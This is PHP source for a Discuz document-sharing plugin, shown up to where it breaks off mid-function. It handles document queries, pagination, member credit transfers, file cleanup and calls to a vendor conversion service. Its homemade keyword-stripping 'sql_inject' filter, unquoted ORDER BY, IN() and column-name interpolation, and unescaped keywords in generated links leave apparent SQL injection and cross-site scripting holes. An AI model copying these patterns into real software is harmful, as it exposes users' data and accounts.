<?php

/**
 *   @CopyRight   http://www.docswf.com
 *   @author      QQ50245077
 */
if (!defined('IN_DISCUZ')) {
    exit('Access Denied');
}

function GetDocInfo5($doctype, $keyword, $exet = '', $uid, $isimport, $state = 1, $pagesize, $cpage, $order = 'docid') {
    $doctype = sql_inject($doctype);
    $keyword = sql_inject($keyword);
    $exet = sql_inject($exet);
    $uid = sql_inject($uid);
    $isimport = sql_inject($isimport);
    $state = sql_inject($state);
    $pagesize = sql_inject($pagesize);
    $cpage = sql_inject($cpage);
    $order = sql_inject($order);

    $keyword = stripsearchkey($keyword);
    $exet = stripsearchkey($exet);

    $state2 = "state='$state'";
    $doctype2 = $doctype !== "" ? "and doctype in ('" . implode("','", GetChildType($doctype)) . "')" : "";
    $keyword2 = $keyword !== "" ? "and ( title like '%$keyword%' or `key` like '%$keyword%' or `short` like '%$keyword%' )" : "";
    $exet2 = $exet !== "" ? "and docpath like '%$exet'" : "";
    $uid2 = $uid !== "" ? "and userid='$uid'" : "";
    $isimport2 = $isimport !== "" ? "and isimport='$isimport'" : "";
    $page = ($cpage - 1) * $pagesize;
    $order2 = $order ? $order : "docid";

    $query = DB::query('SELECT * FROM ' . DB::table('ds_docinfo') . " WHERE $state2 $doctype2 $keyword2 $exet2 $uid2 $isimport2 ORDER BY $order2 desc limit $page,$pagesize");
    $Docinfo5 = array();
    while ($result = DB::fetch($query)) {
        $docpath = 'source/plugin/doc/' . $result['docpath'];
        $docexeten = GetExten($docpath);
        $docdir = GetDir($docpath);
        $pngpath = "";
        $Docinfo5[] = array(
            $result['docid'],
            $docexeten,
            $pngpath,
            $result['title'],
            $result['short'],
            $result['username'],
            $result['freepage'],
            $result['readpay'],
            $result['downpay'],
            $result['viewcount'],
            $result['downcount'],
            $result['uploaddate'],
            $result['isimport']
        );
    }
    return $Docinfo5;
}

function GetDocInfo($docid) {
    $docid = sql_inject($docid);
    $query = DB::query('SELECT * FROM ' . DB::table('ds_docinfo') . " WHERE docid='$docid'");
    $Docinfo = array();
    while ($result = DB::fetch($query)) {
        $docpath = "source/plugin/doc/" . $result['docpath'];
        $docexeten = GetExten($docpath);
        $docdir = GetDir($docpath);
        $docount = GetNums($docdir);
        $Docinfo = array(
            $result['docid'],
            $docexeten,
            $docdir,
            $docpath,
            $result['docsize'],
            $result['title'],
            $result['short'],
            $result['doctype'],
            $result['key'],
            $result['freepage'],
            $result['readpay'],
            $result['downpay'],
            $result['userid'],
            $result['username'],
            $result['uploaddate'],
            $result['viewcount'],
            $result['downcount'],
            $result['isimport'],
            $docount,
            $result['pages'] > $docount? $result['pages']:$docount,
            $result['percent']
        );
    }
    return $Docinfo;
}

function GetViewDir($docid) {
    $docid = sql_inject($docid);
    $query = DB::query('SELECT docpath FROM ' . DB::table('ds_docinfo') . " WHERE docid='$docid'");
    $result = DB::fetch($query);
    return $docdir = GetDir($result['docpath']);
}

function GetPageList($doctype, $keyword, $exet = '', $uid, $isimport, $state = 0, $pagesize, $cpage, $order = 'docid', $t, $w, $doc_rewrite) {
    $doctype = sql_inject($doctype);
    $keyword = sql_inject($keyword);
    $exet = sql_inject($exet);
    $uid = sql_inject($uid);
    $isimport = sql_inject($isimport);
    $state = sql_inject($state);
    $pagesize = sql_inject($pagesize);
    $cpage = sql_inject($cpage);
    $order = sql_inject($order);

    $keyword = stripsearchkey($keyword); 
    $exet = stripsearchkey($exet); 

    $state2 = "state='$state'";
    $doctype2 = $doctype !== "" ? "and doctype in ('" . implode("','", GetChildType($doctype)) . "')" : "";
    $keyword2 = $keyword !== "" ? "and ( title like '%$keyword%' or `key` like '%$keyword%' or `short` like '%$keyword%' )" : "";
    $exet2 = $exet !== "" ? "and docpath like '%$exet'" : "";
    $uid2 = $uid !== "" ? "and userid='$uid'" : "";
    $isimport2 = $isimport !== "" ? "and isimport='$isimport'" : "";
    $page = ($cpage - 1) * $pagesize;
    $order2 = $order ? $order : "docid";

    $query = DB::query('SELECT count(*) as tcount FROM ' . DB::table('ds_docinfo') . " WHERE $state2 $doctype2 $keyword2 $exet2 $uid2 $isimport2 ORDER BY $order2 desc");
    $result = DB::fetch($query);
    $tpage = $result['tcount'] / $pagesize;
    $tpage = ceil($tpage) ? ceil($tpage) : 1;

    $doc_rewrite ? $page = "<a href='$w-$t-p1-k$keyword-s$state.html'>" . lang('plugin/doc', 'homepage') . "</a>" : $page = "<a href=\"plugin.php?id=doc:$w&t=$t&k=$keyword&p=1&s=$state\">" . lang('plugin/doc', 'homepage') . "</a>";

    if ($cpage > 1) {
        $ppage = $cpage - 1;
        $doc_rewrite ? $page .= "<a href='$w-$t-p$ppage-k$keyword-s$state.html'>" . lang('plugin/doc', 'prepage') . "</a>" : $page .= "<a href=\"plugin.php?id=doc:$w&t=$t&k=$keyword&p=$ppage&s=$state\">" . lang('plugin/doc', 'prepage') . "</a>";
    }
    $mon = 5 - $cpage > 0 ? 5 - $cpage : 0;
    for ($i = $cpage - 4; $i <= $cpage + 5 + $mon; $i++) {
        if ($i >= 1 && $i < $cpage) {
            $doc_rewrite ? $page .= "<a href='$w-$t-p$i-k$keyword-s$state.html'>$i</a>" : $page .= "<a href=\"plugin.php?id=doc:$w&t=$t&k=$keyword&p=$i&s=$state\">$i</a>";
        }
        if ($i == $cpage) {
            $page .= "<a style='background-color:#33BB88;color:#fff;text-decoration:none'>$cpage</a>";
        }
        if ($i > $cpage && $i <= $tpage) {
            $doc_rewrite ? $page .= "<a href='$w-$t-p$i-k$keyword-s$state.html'>$i</a>" : $page .= "<a href=\"plugin.php?id=doc:$w&t=$t&k=$keyword&p=$i&s=$state\">$i</a>";
        }
    }
    if ($cpage < $tpage) {
        $npage = $cpage + 1;
        $doc_rewrite ? $page .= "<a href='$w-$t-p$npage-k$keyword-s$state.html'>" . lang('plugin/doc', 'nextpage') . "</a>" : $page .= "<a href=\"plugin.php?id=doc:$w&t=$t&k=$keyword&p=$npage&s=$state\">" . lang('plugin/doc', 'nextpage') . "</a>";
    }
    $doc_rewrite ? $page .= "<a href='$w-$t-p$tpage-k$keyword-s$state.html'>" . lang('plugin/doc', 'mopage') . "</a>" : $page .= "<a href=\"plugin.php?id=doc:$w&t=$t&k=$keyword&p=$tpage&s=$state\">" . lang('plugin/doc', 'mopage') . "</a>";
    return $page;
}

function GetPageList_m($doctype, $keyword, $exet = '', $uid, $isimport, $state = 0, $pagesize, $cpage, $order = 'docid', $t, $w, $doc_rewrite) {
    $doctype = sql_inject($doctype);
    $keyword = sql_inject($keyword);
    $exet = sql_inject($exet);
    $uid = sql_inject($uid);
    $isimport = sql_inject($isimport);
    $state = sql_inject($state);
    $pagesize = sql_inject($pagesize);
    $cpage = sql_inject($cpage);
    $order = sql_inject($order);

    $keyword = stripsearchkey($keyword); 
    $exet = stripsearchkey($exet); 

    $state2 = "state='$state'";
    $doctype2 = $doctype !== "" ? "and doctype in ('" . implode("','", GetChildType($doctype)) . "')" : "";
    $keyword2 = $keyword !== "" ? "and ( title like '%$keyword%' or `key` like '%$keyword%' or `short` like '%$keyword%' )" : "";
    $exet2 = $exet !== "" ? "and docpath like '%$exet'" : "";
    $uid2 = $uid !== "" ? "and userid='$uid'" : "";
    $isimport2 = $isimport !== "" ? "and isimport='$isimport'" : "";
    $page = ($cpage - 1) * $pagesize;
    $order2 = $order ? $order : "docid";

    $query = DB::query('SELECT count(*) as tcount FROM ' . DB::table('ds_docinfo') . " WHERE $state2 $doctype2 $keyword2 $exet2 $uid2 $isimport2 ORDER BY $order2 desc");
    $result = DB::fetch($query);
    $tpage = $result['tcount'] / $pagesize;
    $tpage = ceil($tpage) ? ceil($tpage) : 1;

    $doc_rewrite ? $page = "<a href='$w-$t-p1-k$keyword-s$state.html'>" . lang('plugin/doc', 'homepage') . "</a>" : $page = "<a href=\"plugin.php?id=doc:$w&t=$t&k=$keyword&p=1&s=$state\">" . lang('plugin/doc', 'homepage') . "</a>";

    if ($cpage > 1) {
        $ppage = $cpage - 1;
        $doc_rewrite ? $page .= "<a href='$w-$t-p$ppage-k$keyword-s$state.html'>" . lang('plugin/doc', 'prepage') . "</a>" : $page .= "<a href=\"plugin.php?id=doc:$w&t=$t&k=$keyword&p=$ppage&s=$state\">" . lang('plugin/doc', 'prepage') . "</a>";
    }

    $page .= "<a style='background-color:#33BB88;color:#fff;text-decoration:none'>$cpage/$tpage</a>";

    if ($cpage < $tpage) {
        $npage = $cpage + 1;
        $doc_rewrite ? $page .= "<a href='$w-$t-p$npage-k$keyword-s$state.html'>" . lang('plugin/doc', 'nextpage') . "</a>" : $page .= "<a href=\"plugin.php?id=doc:$w&t=$t&k=$keyword&p=$npage&s=$state\">" . lang('plugin/doc', 'nextpage') . "</a>";
    }
    $doc_rewrite ? $page .= "<a href='$w-$t-p$tpage-k$keyword-s$state.html'>" . lang('plugin/doc', 'mopage') . "</a>" : $page .= "<a href=\"plugin.php?id=doc:$w&t=$t&k=$keyword&p=$tpage&s=$state\">" . lang('plugin/doc', 'mopage') . "</a>";
    return $page;
}

function GetPagePass($doctype, $keyword, $exet = '', $uid, $isimport, $state = 0, $pagesize, $cpage, $order = 'docid', $t) {
    $doctype = sql_inject($doctype);
    $keyword = sql_inject($keyword);
    $exet = sql_inject($exet);
    $uid = sql_inject($uid);
    $isimport = sql_inject($isimport);
    $state = sql_inject($state);
    $pagesize = sql_inject($pagesize);
    $cpage = sql_inject($cpage);
    $order = sql_inject($order);

    $keyword = stripsearchkey($keyword);
    $exet = stripsearchkey($exet);

    $state2 = "state='$state'";
    $doctype2 = $doctype !== "" ? "and doctype in ('" . implode("','", GetChildType($doctype)) . "')" : "";
    $keyword2 = $keyword !== "" ? "and ( title like '%$keyword%' or `key` like '%$keyword%' or `short` like '%$keyword%' )" : "";
    $exet2 = $exet !== "" ? "and docpath like '%$exet'" : "";
    $uid2 = $uid !== "" ? "and userid='$uid'" : "";
    $isimport2 = $isimport !== "" ? "and isimport='$isimport'" : "";
    $page = ($cpage - 1) * $pagesize;
    $order2 = $order ? $order : "docid";

    $query = DB::query('SELECT count(*) as tcount FROM ' . DB::table('ds_docinfo') . " WHERE $state2 $doctype2 $keyword2 $exet2 $uid2 $isimport2 ORDER BY $order2 desc");
    $result = DB::fetch($query);
    $tpage = $result['tcount'] / $pagesize;
    $tpage = ceil($tpage) ? ceil($tpage) : 1;
    $page = "<a href='admin.php?action=plugins&operation=config&identifier=doc&pmod=pass&t=$t&k=$keyword&p=1&s=$state&u=$uid'>" . lang('plugin/doc', 'homepage') . "</a>";
    if ($cpage > 1) {
        $ppage = $cpage - 1;
        $page .= "<a href='admin.php?action=plugins&operation=config&identifier=doc&pmod=pass&t=$t&k=$keyword&p=$ppage&s=$state&u=$uid'>" . lang('plugin/doc', 'prepage') . "</a>";
    }
    $mon = 5 - $cpage > 0 ? 5 - $cpage : 0;
    for ($i = $cpage - 4; $i <= $cpage + 5 + $mon; $i++) {
        if ($i >= 1 && $i < $cpage) {
            $page .= "<a href='admin.php?action=plugins&operation=config&identifier=doc&pmod=pass&t=$t&k=$keyword&p=$i&s=$state&u=$uid'>$i</a>";
        }
        if ($i == $cpage) {
            $page .= "<a style='background-color:#33BB88;color:#fff;text-decoration:none'>$cpage</a>";
        }
        if ($i > $cpage && $i <= $tpage) {
            $page .= "<a href='admin.php?action=plugins&operation=config&identifier=doc&pmod=pass&t=$t&k=$keyword&p=$i&s=$state&u=$uid'>$i</a>";
        }
    }
    if ($cpage < $tpage) {
        $npage = $cpage + 1;
        $page .= "<a href='admin.php?action=plugins&operation=config&identifier=doc&pmod=pass&t=$t&k=$keyword&p=$npage&s=$state&u=$uid'>" . lang('plugin/doc', 'nextpage') . "</a>";
    }
    $page .= "<a href='admin.php?action=plugins&operation=config&identifier=doc&pmod=pass&t=$t&k=$keyword&p=$tpage&s=$state&u=$uid'>" . lang('plugin/doc', 'mopage') . "</a>";
    return $page;
}

function UpdateDocInfo($docid, $title, $short, $key, $freepage, $readpay, $downpay, $doctype) {
    $docid = sql_inject($docid);
    $title = sql_inject($title);
    $short = sql_inject($short);
    $key = sql_inject($key);
    $freepage = sql_inject($freepage);
    $readpay = sql_inject($readpay);
    $downpay = sql_inject($downpay);
    $doctype = sql_inject($doctype, false);
    $query = DB::query(' update ' . DB::table('ds_docinfo') . " set title='$title',short='$short',`key`='$key',freepage='$freepage',readpay='$readpay',downpay='$downpay',doctype='$doctype' WHERE docid='$docid'");
}

function SetDocViewCount($docid) {
    $docid = sql_inject($docid);
    $query = DB::query(' update ' . DB::table('ds_docinfo') . " set viewcount=viewcount+1 WHERE docid='$docid'");
    return $query;
}

function SetDocDownCount($docid) {
    $docid = sql_inject($docid);
    $query = DB::query(' update ' . DB::table('ds_docinfo') . " set downcount=downcount+1 WHERE docid='$docid'");
    return $query;
}

function SetDocPagePercent($pages, $percent, $docpath) {
    $pages = sql_inject($pages);
    $percent = sql_inject($percent, false);
    $docpath = sql_inject($docpath);

    $docpath = stripsearchkey($docpath);

    $query = DB::query(' update ' . DB::table('ds_docinfo') . " set pages='$pages',percent='$percent' WHERE docpath='$docpath'");
    return $query;
}

function GetTotalDoc() {
    $query = DB::query('SELECT count(*) as tcount FROM ' . DB::table('ds_docinfo') . " WHERE state='1' ");
    $result = DB::fetch($query);
    $totaldoc = $result['tcount'];
    return $totaldoc;
}

function GetMyTotalDoc($uid) {
    $uid = sql_inject($uid);

    $uid = $uid ? "and userid='$uid'" : "";
    $query = DB::query('SELECT count(*) as tcount FROM ' . DB::table('ds_docinfo') . " WHERE 1=1 $uid ");
    $result = DB::fetch($query);
    $totaldoc = $result['tcount'];
    return $totaldoc;
}

function GetMyDoc($userid) {
    $userid = sql_inject($userid);

    $query = DB::query('SELECT * FROM ' . DB::table('ds_docinfo') . " WHERE state='0' and userid='$userid' ORDER BY viewcount DESC limit 0,10");
    $Docinfo5 = array();
    while ($result = DB::fetch($query)) {
        $Docinfo5[] = array(
            $result['docid'],
            $result['title'],
            $result['viewcount']
        );
    }
    return $Docinfo5;
}

function GetHotDoc() {
    $query = DB::query('SELECT * FROM ' . DB::table('ds_docinfo') . " WHERE state='0' ORDER BY viewcount DESC limit 0,10");
    $Docinfo5 = array();
    while ($result = DB::fetch($query)) {
        $Docinfo5[] = array(
            $result['docid'],
            $result['title'],
            $result['viewcount']
        );
    }
    return $Docinfo5;
}

function GetLinkDoc($keyword, $key) {
    $keyword = sql_inject($keyword);
    $key = sql_inject($key);

    $keyword = stripsearchkey($keyword);
    $key = stripsearchkey($key);

    $keyword2 = $keyword ? "and title like '%$keyword%' or `key` like '%$key%'" : "";
    $query = DB::query('SELECT * FROM ' . DB::table('ds_docinfo') . " WHERE state='0' $keyword2 limit 0,10");
    $Docinfo5 = array();
    while ($result = DB::fetch($query)) {
        $Docinfo5[] = array(
            $result['docid'],
            $result['title'],
            $result['viewcount']
        );
    }
    return $Docinfo5;
}

function GetHotMember() {
    $query = DB::query('SELECT userid,username FROM ' . DB::table('ds_docinfo') . " WHERE state='0' group by userid,username ORDER BY docid DESC limit 0,10");
    $Docinfo5 = array();
    while ($result = DB::fetch($query)) {
        $Docinfo5[] = array(
            $result['userid'],
            $result['username']
        );
    }
    return $Docinfo5;
}

function IsImport($docid) {
    $docid = sql_inject($docid);
    $query = DB::query(' update ' . DB::table('ds_docinfo') . " set isimport=NOT isimport WHERE docid in ($docid)");
    return $query;
}

function ChangeDocState($docid, $state) {
    $docid = sql_inject($docid);
    $state = sql_inject($state);

    if ($state == -2) {
        $docids = explode(',', $docid);
        foreach ($docids as $docid) {
            if ($docid != -1 && $docid != null && $docid != '') {
                $docinfo = GetDocInfo($docid);
                $docdir = $docinfo[3];
                DelDocInfo($docid);
                DelDocFile($docdir);
            }
        }
    } else {
        $query = DB::query(' update ' . DB::table('ds_docinfo') . " set state=$state WHERE docid in ($docid)");
    }
    return $query;
}

function DelDocInfo($docid) {
    $docid = sql_inject($docid);
    $query = DB::query('delete from ' . DB::table('ds_docinfo') . " where docid in ($docid)");
    return $query;
}

function DelDocFile($docpath,$deldir = true) {    
    global $_G;
    $doc = $_G['cache']['plugin']['doc'];

    $dir = GetDir($docpath);
    $dh = opendir($dir);
    while ($file = readdir($dh)) {
        if ($file != "." && $file != "..") {
            $fullpath = $dir . $file;
            if (!is_dir($fullpath)) {
                unlink($fullpath);
            } else {
                DelDocFile($fullpath);
            }
        }
    }
    closedir($dh);
    unlink($docpath);
    $deldir && rmdir($dir);

    if ($deldir && $doc['doc_oss'] && $oss = new Oss()) {
        $oss->deletefile($docpath);
    }
    return true;
}

function SetMemberExtcredits($uid, $extcredits, $many, $touid, $creditper) {
    $uid = sql_inject($uid);
    $extcredits = sql_inject($extcredits);
    $many = sql_inject($many);
    $touid = sql_inject($touid);
    $creditper = sql_inject($creditper, false);

    if ($extcredits == 'extcredits' || $uid == $touid)
        return true;
    $query = DB::query(' select ' . $extcredits . ' from ' . DB::table('common_member_count') . " WHERE uid='$uid'");
    while ($result = DB::fetch($query)) {
        if ($result[$extcredits] - $many >= 0) {
            DB::query(' update ' . DB::table('common_member_count') . " set $extcredits=$extcredits-$many WHERE uid='$uid'");
            if ($creditper < 0)
                $creditper = 0;
            if ($creditper > 1)
                $creditper = 1;
            $many = (1 - $creditper) * $many;
            DB::query(' update ' . DB::table('common_member_count') . " set $extcredits=$extcredits+$many WHERE uid='$touid'");
            return true;
        } else {
            return false;
        }
    }
    return false;
}

function SetMemberUpExtcredits($uid, $extcredits, $many) {
    $uid = sql_inject($uid);
    $extcredits = sql_inject($extcredits);
    $many = sql_inject($many);

    if ($extcredits == 'extcredits')
        return true;
    DB::query(' update ' . DB::table('common_member_count') . " set $extcredits=$extcredits+$many WHERE uid='$uid'");
    return true;
}

function IsMemberExtcredits($uid, $extcredits, $many) {
    $uid = sql_inject($uid);
    $extcredits = sql_inject($extcredits);
    $many = sql_inject($many);

    if ($extcredits == 'extcredits')
        return false;
    $query = DB::query(' select ' . $extcredits . ' from ' . DB::table('common_member_count') . " WHERE uid='$uid'");
    $result = DB::fetch($query);
    return $result[$extcredits] - $many >= 0;
}

function GetExtcreditesNameByID($id, $credits) {
    $id = sql_inject($id);
    $credits = sql_inject($credits);

    $credits = explode(",", $credits);
    foreach ($credits as $i => $credit) {
        $cre = explode("|", $credit);
        if ($cre[0] == $id)
            return array($cre[1], $cre[2]);
    }
}

function UpdateDocType($type) {
    $type = sql_inject($type, false);    

    if ($type) {
        $types = explode('|', $type);
        foreach ($types as $ty) {
            $tys = explode(',', $ty);
            if (count($tys) == 4) {
                $typeid = $tys[0];

                $data = array(
                    "typename" => $tys[1],
                    "sort" => $tys[2],
                    "pid" => $tys[3],
                );
                if ($typeid == "-1") {
                    DB::insert('ds_doctype', $data);
                } else {
                    DB::query(' update ' . DB::table('ds_doctype') . " set typename='$tys[1]',sort=$tys[2],pid=$tys[3] WHERE typeid=$typeid");
                }
            }
        }
    }
}

function DelType($typeid) {
    $typeid = sql_inject($typeid);
    $query = DB::query('delete from ' . DB::table('ds_doctype') . " where typeid=$typeid");

    $query = DB::query('SELECT docid,docpath FROM ' . DB::table('ds_docinfo') . " WHERE doctype=$typeid");
    while ($result = DB::fetch($query)) {
        $docpath = 'source/plugin/doc/' . $result['docpath'];
        DelDocInfo($result['docid']);
        DelDocFile($docpath);
    }
    return $query;
}

function GetDocType($pid) {
    $pid = sql_inject($pid);
    $query = DB::query('SELECT typeid,typename,sort,pid FROM ' . DB::table('ds_doctype') . " WHERE pid=$pid order by sort");
    $typename = array();
    while ($result = DB::fetch($query)) {
        $typename[] = array($result[typeid], $result[typename], $result[sort], $result[pid]);
    }
    return $typename;
}

function GetDocTypeID($name) {
    $name = sql_inject($name);
    $query = DB::query('SELECT typeid FROM ' . DB::table('ds_doctype') . " WHERE typename='$name' limit 0,1");
    $result = DB::fetch($query);
    $typeid = $result['typeid'];
    return $typeid;
}

function GetDocTypeName($typeid) {
    $typeid = sql_inject($typeid);
    $query = DB::query('SELECT typename FROM ' . DB::table('ds_doctype') . " WHERE typeid='$typeid' limit 0,1");
    $result = DB::fetch($query);
    $typename = $result['typename'];
    return $typename;
}

function GetChildType($pid) {
    $pid = sql_inject($pid);
    $query = DB::query('SELECT typeid FROM ' . DB::table('ds_doctype') . " WHERE pid=$pid order by sort");
    $typeids = array();
    array_push($typeids, $pid);
    while ($result = DB::fetch($query)) {
        array_push($typeids, $result[typeid]);
        $typeids = array_merge($typeids, GetChildType($result[typeid]));
    }
    return $typeids;
}

function InsertLog($logname, $docid, $userid, $username) {
    $logname = sql_inject($logname);
    $docid = sql_inject($docid);
    $userid = sql_inject($userid);
    $username = sql_inject($username);
    $query = DB::query('SELECT count(*) as fcount  FROM ' . DB::table('ds_doclog') . " WHERE logname='$logname' and docid='$docid' and userid='$userid'");
    $result = DB::fetch($query);
    if ($result['fcount'] == '0') {
        $logdata = array(
            'logname' => $logname,
            'logcount' => 1,
            'docid' => $docid,
            'userid' => $userid,
            'username' => $username,
            'logdate' => date('Y-m-d', time()),
            'state' => '0'
        );
        DB::insert('ds_doclog', $logdata);
        return false;
    } else {
        DB::query(' update ' . DB::table('ds_doclog') . " set logcount=logcount+1 WHERE logname='$logname' and docid='$docid' and userid='$userid'");
        return true;
    }
}

function IsPayRead($docid, $userid) {
    $docid = sql_inject($docid);
    $userid = sql_inject($userid);
    if ($docid && $userid) {
        $query = DB::query('SELECT count(*) as fcount  FROM ' . DB::table('ds_doclog') . " WHERE logname='payread' and docid='$docid' and userid='$userid'");
        $result = DB::fetch($query);
        if ($result['fcount'] == 0) {
            return false;
        } else {
            return true;
        }
    } else {
        return false;
    }
}

function IsDownLoad($docid, $userid) {
    $docid = sql_inject($docid);
    $userid = sql_inject($userid);
    $query = DB::query('SELECT count(*) as fcount  FROM ' . DB::table('ds_doclog') . " WHERE logname='down' and docid='$docid' and userid='$userid'");
    $result = DB::fetch($query);
    if ($result['fcount'] == 0) {
        return false;
    } else {
        return true;
    }
}

function GetExten($file) {
    return substr(strrchr($file, '.'), 1);
}

function GetDir($file) {
    return substr($file, 0, strrpos($file, '.')) . "/";
}

function GetSwfWH($path) {
    $fp = @fopen($path, "rb");
    if ($fp) {
        fseek($fp, 4);
        $a2 = "";
        for ($i = 0; $i < 4; $i++) {
            $a1 = fread($fp, 1);
            $a2 = bin2hex($a1) . $a2;
        }
        $size = base_convert($a2, 16, 10);

        $b0 = fread($fp, $size);
        $b0 = gzuncompress($b0, $size);

        $b1 = substr($b0, 0, 9);
        $b2 = bin2hex($b1);
        $b3 = str_split($b2);
        $b4 = "";
        foreach ($b3 as $b) {
            $b4 .= sprintf("%04b", base_convert($b, 16, 10));
        }

        $c0 = substr($b4, 0, 5);
        $d0 = base_convert($c0, 2, 10);

        $c1 = substr($b4, 5, $d0);
        $d1 = base_convert($c1, 2, 10) / 20;

        $c2 = substr($b4, 5 + $d0, $d0);
        $d2 = base_convert($c2, 2, 10) / 20;

        $c3 = substr($b4, 5 + $d0 + $d0, $d0);
        $d3 = base_convert($c3, 2, 10) / 20;

        $c4 = substr($b4, 5 + $d0 + $d0 + $d0, $d0);
        $d4 = base_convert($c4, 2, 10) / 20;

        fclose($fp);

        return $d4 / $d2;
    }
}

function GetComment($docid, $pagesize, $cpage) {
    $docid = sql_inject($docid);
    $pagesize = sql_inject($pagesize);
    $cpage = sql_inject($cpage);
    $page = ($cpage - 1) * $pagesize;
    $query = DB::query('SELECT * FROM ' . DB::table('ds_doccomment') . " WHERE state='0' and docid='$docid' ORDER BY commentid DESC limit $page,$pagesize");
    $Comment = array();
    while ($result = DB::fetch($query)) {
        $Comment[] = array(
            $result['commentid'],
            $result['comment'],
            $result['star'] * 16.2,
            $result['uploaddate'],
            $result['docid'],
            $result['userid'],
            $result['username']
        );
    }
    return $Comment;
}

function DelComment($commentid) {
    $commentid = sql_inject($commentid);
    $query = DB::query('delete from ' . DB::table('ds_doccomment') . " where commentid=$commentid");
    return $query;
}

function GetCommentPage($docid, $pagesize, $cpage) {
    $docid = sql_inject($docid);
    $pagesize = sql_inject($pagesize);
    $cpage = sql_inject($cpage);
    $query = DB::query('SELECT count(*) as tcount FROM ' . DB::table('ds_doccomment') . " WHERE state='0' and docid='$docid' ORDER BY commentid desc");
    $result = DB::fetch($query);
    $tpage = $result['tcount'] / $pagesize;
    $tpage = ceil($tpage) ? ceil($tpage) : 1;
    $page = "<a data='p=1'>" . lang('plugin/doc', 'homepage') . "</a>";
    if ($cpage > 1) {
        $ppage = $cpage - 1;
        $page .= "<a p='$ppage'>" . lang('plugin/doc', 'prepage') . "</a>";
    }
    $mon = 5 - $cpage > 0 ? 5 - $cpage : 0;
    for ($i = $cpage - 4; $i <= $cpage + 5 + $mon; $i++) {
        if ($i >= 1 && $i < $cpage) {
            $page .= "<a p='$i'>$i</a>";
        }
        if ($i == $cpage) {
            $page .= "<a style='background-color:#33BB88;color:#fff;text-decoration:none'>$cpage</a>";
        }
        if ($i > $cpage && $i <= $tpage) {
            $page .= "<a p='$i'>$i</a>";
        }
    }
    if ($cpage < $tpage) {
        $npage = $cpage + 1;
        $page .= "<a p='$npage'>" . lang('plugin/doc', 'nextpage') . "</a>";
    }
    $page .= "<a p='$tpage'>" . lang('plugin/doc', 'mopage') . "</a>";
    return $page;
}

function GetCommentStar($docid) {
    $docid = sql_inject($docid);
    $query = DB::query('SELECT avg(star) as star  FROM ' . DB::table('ds_doccomment') . " WHERE state='0' and docid='$docid'");
    $result = DB::fetch($query);
    $star = $result['star'] * 16.2;
    return $star;
}

function GetCommentCount($docid) {
    $docid = sql_inject($docid);
    $query = DB::query('SELECT count(*) as fcount  FROM ' . DB::table('ds_doccomment') . " WHERE state='0' and docid='$docid'");
    $result = DB::fetch($query);
    $star = $result['fcount'];
    return $star;
}

function sql_inject($str, $b = true) {
    if (is_numeric($str) && $b) {
        return intval($str);
    }

    if (!get_magic_quotes_gpc() && $b) {
        $str = addslashes($str);
    }

    $str = str_replace("select", "", $str);
    $str = str_replace("insert", "", $str);
    $str = str_replace("update", "", $str);
    $str = str_replace("delete", "", $str);
    $str = str_replace("%", "", $str);
    $str = str_replace("#", "", $str);
    $str = str_replace("--", "", $str);
    $str = str_replace("/*", "", $str);
    $str = str_replace("*/", "", $str);

    return $str;
}

function GetNums($path) {
    $count1 = 0;
    $count2 = 0;
    $file = null;
    if (is_dir($path) && $handle = opendir($path)) {
        while ($file = (readdir($handle))) {
            if (GetExten($file) == 'h5') {
                $count1++;
            }
            if (GetExten($file) == 'view') {
                $count2++;
            }
        }
        closedir($handle);
    }
    global $_G;
    $doc = $_G['cache']['plugin']['doc'];
    if ( $doc['doc_oss'] && $oss = new Oss()) {
        $count2 = $oss->get_pcount($path) - 1;
    }

    return $count1 > $count2 ? $count1 : $count2;
}

function synoss($docpath)
{
    if ($oss = new Oss()) {
        if (file_exists($docpath)) {
            $oss->uploadfile($docpath, $docpath);
        }
        if (($dir = GetDir($docpath)) && is_dir($dir) && $dh = opendir($dir)) {
            while ($filename = readdir($dh)) {
                if ($filename != '.' && $filename != '..') {
                    $oss->uploadfile($dir . $filename, $dir . $filename);
                }
            }
        }
        global $_G;
        $doc = $_G['cache']['plugin']['doc'];
        if ($doc['doc_oss_delfile']) {
            DelDocFile($docpath, false);
        }
    }
}

function echofile($file,$real)
{
    global $_G;
    $doc = $_G['cache']['plugin']['doc'];
    if (file_exists($file)) {
        $real && readfile($file);
        return true;
    } else if ($doc['doc_oss'] && ($oss = new Oss()) && $oss->objectexists($file)) {
        $url = $oss->signUrl($file);
        if ($doc['doc_oss_fluxoss']) {
            $real && header('Location:' . $url);
        } else {
            $real && readfile($url);
        }
        return true;
    } else {
        return false;
    }
}

function Cpost($from_host, $from_dir, $from_path, $from_aurl, $from_name, $from_page, $doc_copy,$ish5, $gbk = 0) {
    if ($from_host && $from_dir && $from_path && $from_aurl && $from_name) {
        if ($gbk)
            $from_name = iconv('gbk', 'utf-8', $from_name);
        $service = "http://do.docswf.com/doc.do";
        $data = array(
            "from_host" => $from_host,
            "from_dir" => $from_dir,
            "from_path" => $from_path,
            "from_aurl" => $from_aurl,
            "from_name" => $from_name,
            "from_page" => $from_page,
			"from_h5"   => $ish5,
			"from_copy"   => $doc_copy,
            "from_mode" => 'discuz/doc/3.9',
        );
        if (function_exists('curl_init') && function_exists('curl_exec')) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $service);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_TIMEOUT, 60);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
            $result = curl_exec($ch);
            curl_close($ch);
            return $result;
        } else {
            $data = http_build_query($data);
            $cont = array(
                'http' => array(
                    'method' => 'POST',
                    'content' => $data)
            );
            $context = stream_context_create($cont);
            $result = file_get_contents($service, false, $context);
            return $result;
        }
    } else {
        return '-12';
    }
}

function CSee($id) {
    if ($id) {
        $service = "http://do.docswf.com/see.do";
        $data = array(
            "host" => $id,
            "mode" => 'discuz/doc'
        );
        if (function_exists('curl_init') && function_exists('curl_exec')) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $service);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_TIMEOUT, 60);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
            $result = curl_exec($ch);
            curl_close($ch);
            return $result;
        } else {
            $data = http_build_query($data);
            $cont = array(
                'http' => array(
                    'method' => 'POST',
                    'content' => $data)
            );
            $context = stream_context_create($cont);
